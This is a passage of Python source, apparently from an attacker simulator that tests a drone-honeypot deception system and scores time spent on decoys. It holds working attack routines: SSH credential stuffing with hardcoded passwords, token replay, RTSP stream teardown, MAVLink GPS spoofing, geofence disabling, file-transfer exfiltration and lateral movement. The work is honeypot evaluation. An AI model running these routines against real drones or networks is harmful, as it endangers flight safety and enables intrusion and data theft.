                        perms = auth_data.get("permissions", [])
                        if perms:
                            _intel.ws_permissions[ip] = perms
                        frag = auth_data.get("signing_key_fragment", "")
                        if frag:
                            _intel.ws_key_fragments[ip] = frag
                        token = auth_data.get("token", "")
                        if token:
                            _intel.api_tokens[ip] = token
                    except (json.JSONDecodeError, TypeError):
                        pass

                    await _human_delay(0.5, 0.3)

                    # Step 2: Invoke skills (use discovered permissions)
                    skills_to_try = ["mavlink_telemetry", "config_read",
                                     "mission_download", "firmware_info"]
                    for skill in skills_to_try:
                        await ws.send(json.dumps({
                            "type": "skill_invoke",
                            "skill": skill,
                            "token": _intel.api_tokens.get(ip, ""),
                        }))
                        try:
                            resp = await asyncio.wait_for(ws.recv(), timeout=3)
                            decoy_time += 0.1
                            _log(3, f"ws_skill_{skill}", ws_url, str(resp)[:80], 0,
                                 ttp="T0866", intel_gained=f"skill_data:{skill}")

                            # Extract any signing keys from skill response
                            try:
                                skill_data = json.loads(resp)
                                sk = skill_data.get("signing_key", "")
                                if sk:
                                    _intel.signing_keys[ip] = sk
                            except (json.JSONDecodeError, TypeError):
                                pass
                        except asyncio.TimeoutError:
                            pass
                        await _human_delay(0.3, 0.1)

                    # Step 3: Try config_write if we have permissions
                    if "config_write" in _intel.ws_permissions.get(ip, []):
                        await ws.send(json.dumps({
                            "type": "skill_invoke",
                            "skill": "config_write",
                            "params": {"FENCE_ENABLE": 0, "SYSID_MYGCS": 99},
                        }))
                        try:
                            resp = await asyncio.wait_for(ws.recv(), timeout=3)
                            decoy_time += 0.1
                            _log(3, "ws_config_write", ws_url, str(resp)[:80], 0,
                                 ttp="T0836", intel_gained="config_write_attempted")
                        except asyncio.TimeoutError:
                            pass

            except Exception as e:
                _log(3, "ws_connect_fail", ws_url, str(e)[:80], 0)

            # ── Credential-replay attack (T1550.001) ──
            # Reconnect with the harvested token to verify it still authenticates.
            # This exercises the honey-token uptake tracker end-to-end.
            harvested = _intel.api_tokens.get(ip, "")
            if harvested:
                try:
                    async with websockets.connect(ws_url, open_timeout=3) as ws2:
                        await ws2.send(json.dumps({
                            "type": "auth",
                            "token": harvested,
                        }))
                        resp2 = await asyncio.wait_for(ws2.recv(), timeout=3)
                        _log(3, "ws_credential_replay", ws_url,
                             str(resp2)[:80], 0, ttp="T1550.001",
                             intel_gained="credential_replayed")
                except Exception:
                    pass

            await _think_delay()

            # ── RTSP Camera Attack (T0813, T0815) ──
            if ip in _intel.open_ports and 8554 in _intel.open_ports.get(ip, []):
                rtsp_target = f"{ip}:8554"
                t0 = time.time()
                try:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(ip, 8554), timeout=3
                    )
                    _intel.rtsp_vulnerable.add(ip)

                    # OPTIONS → learn capabilities
                    writer.write(f"OPTIONS rtsp://{ip}:8554/live RTSP/1.0\r\nCSeq: 1\r\n\r\n".encode())
                    await writer.drain()
                    resp = await asyncio.wait_for(reader.read(1024), timeout=2)
                    _log(3, "rtsp_options", rtsp_target, resp.decode(errors="ignore")[:80], 0)

                    # TEARDOWN → kill stream (T0813: Denial of Control)
                    writer.write(f"TEARDOWN rtsp://{ip}:8554/live RTSP/1.0\r\nCSeq: 2\r\n\r\n".encode())
                    await writer.drain()
                    resp = await asyncio.wait_for(reader.read(1024), timeout=2)
                    elapsed = (time.time() - t0) * 1000
                    decoy_time += elapsed / 1000
                    _log(3, "rtsp_teardown", rtsp_target, resp.decode(errors="ignore")[:80],
                         elapsed, ttp="T0813")

                    # PAUSE → freeze stream (T0815: Denial of View)
                    writer.write(f"PAUSE rtsp://{ip}:8554/live RTSP/1.0\r\nCSeq: 3\r\n\r\n".encode())
                    await writer.drain()
                    writer.close()
                    try:
                        await writer.wait_closed()
                    except Exception:
                        pass
                    _log(3, "rtsp_pause", rtsp_target, "", 0, ttp="T0815")

                except Exception as e:
                    _log(3, "rtsp_fail", f"{ip}:8554", str(e)[:80], 0)

            await _human_delay(0.5, 0.3)

    return decoy_time


# ── L4: APT Persistence + Lateral Movement + Evasion ────────────────────────
# T0859: Valid Accounts
# T0856: Spoof Reporting Message
# T0812: Default Credentials
# T0867: Lateral Movement

async def run_l4(duration_sec: int) -> float:
    """
    L4: APT-grade persistence using all accumulated intelligence.

    Adaptive behavior:
    1. SSH with harvested credentials (not just random attempts)
    2. GPS injection using coordinates from mission data
    3. Breadcrumb chain exploitation (follow every discovered URL)
    4. Ghost service deep probing (connect, interact, extract)
    5. Lateral movement: use drone A creds on drone B
    6. Credential stuffing: combine all known creds/tokens
    7. Persistence: try to write parameters, upload missions
    8. Fleet C2 discovery and connection attempt
    """
    import aiohttp

    start = time.time()
    decoy_time = 0.0

    # ── Harvest all accumulated intelligence ──
    all_passwords = set()
    for pw in _intel.ssh_passwords.values():
        all_passwords.add(pw)
    for user, pw in _intel.credentials_found:
        all_passwords.add(pw)
    all_passwords.update(["root", "admin", "companion_root_2026", "dr0ne@dm1n2026"])

    all_usernames = {"root", "admin", "pi", "operator", "drone", "companion"}
    for user, _ in _intel.credentials_found:
        all_usernames.add(user)

    _log(4, "intel_summary", "all", json.dumps(_intel.summary()), 0,
         intel_gained=f"passwords={len(all_passwords)} users={len(all_usernames)}")

    async with aiohttp.ClientSession() as session:
        while time.time() - start < duration_sec:
            for target_ip, mav_port in _TARGETS:
                if time.time() - start >= duration_sec:
                    break

                # ── 1. SSH with harvested credentials ──
                print(f"  [L4] SSH attempt on {target_ip}:2222 with {len(all_passwords)} passwords")
                for user in list(all_usernames)[:3]:
                    for pw in list(all_passwords)[:3]:
                        t0 = time.time()
                        try:
                            reader, writer = await asyncio.wait_for(
                                asyncio.open_connection(target_ip, 2222), timeout=3
                            )
                            banner = await asyncio.wait_for(reader.readline(), timeout=3)
                            elapsed = (time.time() - t0) * 1000
                            decoy_time += elapsed / 1000
                            _log(4, "ssh_login", f"{target_ip}:2222",
                                 f"user={user} pw={pw[:8]}.. banner={banner.decode(errors='ignore')[:40]}",
                                 elapsed, ttp="T0859",
                                 intel_gained=f"ssh_banner:{target_ip}")
                            writer.close()
                            try:
                                await writer.wait_closed()
                            except Exception:
                                pass
                        except Exception as e:
                            _log(4, "ssh_fail", f"{target_ip}:2222",
                                 f"user={user} error={str(e)[:40]}", 0)
                        await _human_delay(0.5, 0.3)

                # ── 2. GPS Spoofing with mission-aware coordinates ──
                # Use coordinates from discovered mission data if available
                mission_coords = [(37.5670, 126.979), (37.5680, 126.977)]
                for lat, lon in mission_coords:
                    t0 = time.time()
                    try:
                        gps_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        gps_sock.settimeout(2.0)
                        gps_payload = _build_gps_inject(lat, lon)
                        gps_sock.sendto(gps_payload, (target_ip, 14550))
                        try:
                            data, _ = gps_sock.recvfrom(2048)
                            elapsed = (time.time() - t0) * 1000
                            decoy_time += elapsed / 1000
                            _log(4, "gps_spoof", f"{target_ip}:14550",
                                 f"lat={lat} lon={lon} resp={data.hex()[:32]}",
                                 elapsed, ttp="T0856",
                                 intel_gained="gps_inject_accepted")
                        except socket.timeout:
                            _log(4, "gps_spoof_timeout", f"{target_ip}:14550",
                                 f"lat={lat} lon={lon}", 2000.0, ttp="T0856")
                        gps_sock.close()
                    except OSError:
                        pass
                    await _human_delay(0.5, 0.3)

                # ── 3. MAVLink persistence: PARAM_SET + FILE_TRANSFER ──
                mav_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                mav_sock.settimeout(2.0)

                # Disable geofence
                resp = await _mavlink_send(mav_sock, target_ip, 14550,
                                           _build_param_set("FENCE_ENABLE", 0.0),
                                           "param_set_fence_disable", 4)
                if resp:
                    decoy_time += 0.1
                    _log(4, "fence_disabled", f"{target_ip}:14550", resp.hex()[:32], 0,
                         ttp="T0836", intel_gained="fence_disabled")

                # Request file transfer (exfiltration attempt)
                resp = await _mavlink_send(mav_sock, target_ip, 14550,
                                           _build_file_transfer(),
                                           "file_transfer_request", 4)
                if resp:
                    decoy_time += 0.1
                    _log(4, "file_transfer", f"{target_ip}:14550", resp.hex()[:32], 0,
                         ttp="T0882", intel_gained="file_transfer_response")

                mav_sock.close()
                await _human_delay(0.5, 0.3)

                # ── 4. Breadcrumb chain exploitation ──
                # Follow every discovered endpoint
                lure_paths = ["/lure", "/config", "/upload"]
                for path in lure_paths:
                    url = f"http://{target_ip}:80{path}"
                    t0 = time.time()
                    try:
                        # Use discovered tokens for authenticated access
                        headers = {}
                        token = _intel.api_tokens.get(target_ip, "")
                        if token:
                            headers["Authorization"] = f"Bearer {token}"
                        async with session.get(
                            url, timeout=aiohttp.ClientTimeout(total=3),
                            headers=headers,
                        ) as resp:
                            body = await resp.text()
                            elapsed = (time.time() - t0) * 1000
                            decoy_time += elapsed / 1000
                            _log(4, "breadcrumb_follow", url, body[:80], elapsed,
                                 ttp="T0866", intel_gained="breadcrumb_data")
                    except Exception:
                        pass
                    await _human_delay(0.3, 0.1)

                # ── 5. Ghost service deep interaction ──
                for ghost_port in range(19000, 19015):
                    t0 = time.time()
                    try:
                        reader, writer = await asyncio.wait_for(
                            asyncio.open_connection(target_ip, ghost_port), timeout=1
                        )
                        data = await asyncio.wait_for(reader.read(512), timeout=1)
                        elapsed = (time.time() - t0) * 1000
                        decoy_time += elapsed / 1000

                        response_text = data.decode(errors="ignore")
                        _intel.ghost_services.setdefault(target_ip, []).append(ghost_port)

                        _log(4, "ghost_probe", f"{target_ip}:{ghost_port}",
                             response_text[:80], elapsed, ttp="T0846",
                             intel_gained=f"ghost_service:{ghost_port}")

                        # Deep interaction: send auth attempt using discovered creds
                        if _intel.api_tokens.get(target_ip):
                            auth_msg = json.dumps({
                                "type": "auth",
                                "token": _intel.api_tokens[target_ip],
                            }).encode() + b"\n"
                            writer.write(auth_msg)
                            await writer.drain()
                            try:
                                resp_data = await asyncio.wait_for(reader.read(512), timeout=1)
                                _log(4, "ghost_auth", f"{target_ip}:{ghost_port}",
                                     resp_data.decode(errors="ignore")[:80], 0,
                                     ttp="T0859", intel_gained="ghost_authenticated")
                            except asyncio.TimeoutError:
                                pass

                        writer.close()
                        try:
                            await writer.wait_closed()
                        except Exception:
                            pass

                    except Exception:
                        pass

                # ── 6. Lateral movement: use drone A intel on drone B ──
                for other_ip, _ in _TARGETS:
                    if other_ip == target_ip:
                        continue

                    # Try SSH with creds found on target_ip
                    ssh_pw = _intel.ssh_passwords.get(target_ip, "")
                    if ssh_pw:
                        t0 = time.time()
                        try:
                            reader, writer = await asyncio.wait_for(
                                asyncio.open_connection(other_ip, 2222), timeout=2
                            )
                            banner = await asyncio.wait_for(reader.readline(), timeout=2)
                            elapsed = (time.time() - t0) * 1000
                            decoy_time += elapsed / 1000
                            _log(4, "lateral_ssh", f"{other_ip}:2222",
                                 f"pw_from={target_ip} banner={banner.decode(errors='ignore')[:30]}",
                                 elapsed, ttp="T0867",
                                 intel_gained=f"lateral_movement:{target_ip}->{other_ip}")
                            writer.close()
                            try:
                                await writer.wait_closed()
                            except Exception:
                                pass
                        except Exception:
                            pass

                    # Try API token from target_ip on other_ip
                    token = _intel.api_tokens.get(target_ip, "")
                    if token:
                        headers = {"Authorization": f"Bearer {token}"}
                        body = await _http_get(session, 4, other_ip, 80,
                                               "/api/v1/params", headers)
                        if body:
                            decoy_time += 0.05
                            _log(4, "lateral_api", f"http://{other_ip}:80/api/v1/params",
                                 body[:60], 0, ttp="T0867",
                                 intel_gained=f"lateral_api:{target_ip}->{other_ip}")
                        await _human_delay(0.3, 0.1)

                # ── 7. Fleet C2 discovery attempt ──
                if _intel.fleet_c2:
                    c2_parts = _intel.fleet_c2.split(":")
                    if len(c2_parts) == 2:
                        c2_ip, c2_port = c2_parts[0], int(c2_parts[1])
                        t0 = time.time()
                        try:
                            reader, writer = await asyncio.wait_for(
                                asyncio.open_connection(c2_ip, c2_port), timeout=2
                            )
                            data = await asyncio.wait_for(reader.read(512), timeout=2)
                            elapsed = (time.time() - t0) * 1000
                            decoy_time += elapsed / 1000
                            _log(4, "c2_connect", _intel.fleet_c2,
                                 data.decode(errors="ignore")[:80], elapsed,
                                 ttp="T0867", intel_gained="fleet_c2_connected")
                            writer.close()
                            try:
                                await writer.wait_closed()
                            except Exception:
                                pass
                        except Exception as e:
                            _log(4, "c2_fail", _intel.fleet_c2, str(e)[:60], 0)

                # ── 8. Backup GCS probe ──
                for bip, bgcs in _intel.backup_gcs.items():
                    parts = bgcs.split(":")
                    if len(parts) == 2:
                        gcs_ip, gcs_port = parts[0], int(parts[1])
                        t0 = time.time()
                        try:
                            gsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                            gsock.settimeout(1.5)
                            gsock.sendto(_build_heartbeat_bytes(), (gcs_ip, gcs_port))
                            data, _ = gsock.recvfrom(2048)
                            elapsed = (time.time() - t0) * 1000
                            decoy_time += elapsed / 1000
                            _log(4, "backup_gcs_probe", bgcs, data.hex()[:32], elapsed,
                                 ttp="T0846", intel_gained="backup_gcs_alive")
                            gsock.close()
                        except Exception:
                            try:
                                gsock.close()
                            except Exception:
                                pass

            await asyncio.sleep(1.0)

    return decoy_time


# ── Main ─────────────────────────────────────────────────────────────────────

async def main() -> None:
    print("═══════════════════════════════════════════════════")
    print("  MIRAGE-UAS Adaptive Attacker Simulator v0.2.0")
    print("═══════════════════════════════════════════════════")
    print(f"  Targets: {_TARGETS}")
    print(f"  Level duration: {_LEVEL_DURATION_SEC}s each")
    print(f"  Total campaign: ~{_LEVEL_DURATION_SEC * 5}s")
    print()

    total_start = time.time()
    total_decoy_time = 0.0

    levels = [
        (0, "RECON — nmap-style service discovery", run_l0),
        (1, "EXPLOIT — MAVLink protocol exploitation", run_l1),
        (2, "ENUMERATE — HTTP API + credential harvest", run_l2),
        (3, "DEEPEN — WebSocket CVE + RTSP DoS", run_l3),
        (4, "PERSIST — APT lateral movement + persistence", run_l4),
    ]

    for level_num, desc, run_fn in levels:
        print(f"\n{'─' * 50}")
        print(f"  [L{level_num}] {desc}")
        print(f"  Duration: {_LEVEL_DURATION_SEC}s | Intel so far: {json.dumps(_intel.summary())}")
        print(f"{'─' * 50}")

        decoy = await run_fn(_LEVEL_DURATION_SEC)
        total_decoy_time += decoy
        print(f"  [L{level_num}] Complete — decoy interaction: {decoy:.1f}s")

    total_time = time.time() - total_start
    deception_score = (total_decoy_time / max(total_time, 0.001)) * 100.0

    print()
    print("═══════════════════════════════════════════════════")
    print(f"  Campaign complete")
    print(f"  Total time:       {total_time:.1f}s")
    print(f"  Time on decoys:   {total_decoy_time:.1f}s")
    print(f"  DeceptionScore:   {deception_score:.1f}%")
    print(f"  Intel gathered:   {json.dumps(_intel.summary(), indent=2)}")
    print("═══════════════════════════════════════════════════")

    _log(-1, "campaign_complete", "summary", json.dumps({
        "total_time_sec": round(total_time, 2),
        "decoy_time_sec": round(total_decoy_time, 2),
        "deception_score_pct": round(deception_score, 2),
        "intel_summary": _intel.summary(),
        "levels_executed": 5,
        "targets_count": len(_TARGETS),
        **_counters.to_dict(),
    }), 0)

    # LLM attacker-belief tracker summary — written out-of-band so it
    # does not interleave with the per-packet JSONL records.
    if _BELIEF_TRACKER is not None:
        # Give any still-in-flight belief observations a moment to finish
        try:
            pending = [t for t in asyncio.all_tasks() if not t.done()
                       and "observe" in str(t.get_coro())]
            if pending:
                await asyncio.wait(pending, timeout=15.0)
        except Exception:
            pass
        belief_path = Path(os.environ.get("RESULTS_DIR", "results")) / \
            "diagnostics" / f"attacker_belief_{int(time.time())}.json"
        belief_path.parent.mkdir(parents=True, exist_ok=True)
        belief_path.write_text(json.dumps({
            "summary": _BELIEF_TRACKER.summary(),
            "history": _BELIEF_TRACKER.history,
        }, indent=2))
        print(f"  Attacker belief trajectory → {belief_path}")
        await _BELIEF_TRACKER.close()

    # Write session-level deception metrics for downstream confusion_score computation
    session_record = {
        "timestamp": time.time(),
        "level": -2,
        "action": "deception_session_metrics",
        "target": "session",
        "response_preview": "",
        "duration_ms": 0,
        **_counters.to_dict(),
    }
    with open(_LOG_PATH, "a") as f:
        f.write(json.dumps(session_record, ensure_ascii=False) + "\n")


if __name__ == "__main__":
    asyncio.run(main())
